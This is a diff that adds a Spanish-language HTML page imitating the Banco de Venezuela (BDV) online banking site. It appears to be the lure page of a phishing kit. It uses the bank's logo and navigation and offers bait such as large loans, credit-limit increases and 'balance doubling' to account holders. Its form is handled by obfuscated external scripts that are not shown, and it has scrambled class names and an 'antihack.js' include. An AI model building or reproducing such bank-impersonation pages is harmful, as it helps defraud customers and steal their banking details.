@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acceso al Sistema</title>
+    <link rel="stylesheet" href="src/css/f8b2_v94x.css">
+    <script>
+        if (self !== top) { top.location = self.location; }
+
+    </script>
+</head>
+<body>
+
+    <div id="loader">
+        <div class="loader-bar"></div>
+        <div class="loader-bar"></div>
+        <div class="loader-bar"></div>
+        <div class="loader-bar"></div>
+    </div>
+
+    <header class="bnk_top_banner">
+        <div class="bnk_nav_left">
+            <img src="src/img/logomain.png" alt="BDV" class="bnk_main_logo">
+            <nav class="bnk_nav_links">
+                <div class="bnk_nav_item">SomosBDV <span>▼</span></div>
+                <div class="bnk_nav_item">Para ti <span>▼</span></div>
+                <div class="bnk_nav_item">Para tu empresa <span>▼</span></div>
+            </nav>
+        </div>
+        <div class="bnk_mobile_menu">
+            <div class="bnk_bar"></div>
+            <div class="bnk_bar"></div>
+            <div class="bnk_bar"></div>
+        </div>
+    </header>
+
+    <div class="qzm_m42x_wrapper">
+        
+        <div class="trn_j83p_logo">
+            <img class="vtx_icon" src="src/img/logo.png" alt="BDV enlínea personas">
+        </div>
+
+        <form class="lkh_d22v_form" id="secureForm" method="POST" onsubmit="validateAndProcess(event)">
+            <div class="jfd_field_group">
+                <select id="tx_tramite_id" name="tx_tramite_name" required>
+                    <option value="" disabled selected hidden>Seleccione el trámite *</option>
+                    <option value="c100">Solicitud de Crédito 100.000 Bs. a 1 millon</option>
+                    <option value="mf">Financiamiento de Moto</option>
+                    <option value="atc">Aumento de Límite de Tarjeta de Crédito</option>
+                    <option value="ds">Duplicidad de Saldo</option>
+                    <option value="ds">Obtener tarjeta de credito</option>
+                </select>
+
+                <button type="submit" class="bttn_z99x_submit" id="submitBtn">Comenzar solicitud</button>
+            </div>
+        </form>
+
+        <div class="bnk_req_container">
+            <p class="bnk_req_title">Requisitos:</p>
+            <ul class="bnk_req_list">
+                <li>Poseer cuenta activa en el BDV</li>
+                <li>Cuenta con antigüedad de 2 meses mínimo</li>
+            </ul>
+        </div>
+    </div>
+    <script src="src/js/k9a1_w38z.js" defer></script>
+  <script src="src/js/antihack.js"></script>
+
+</body>
+</html>
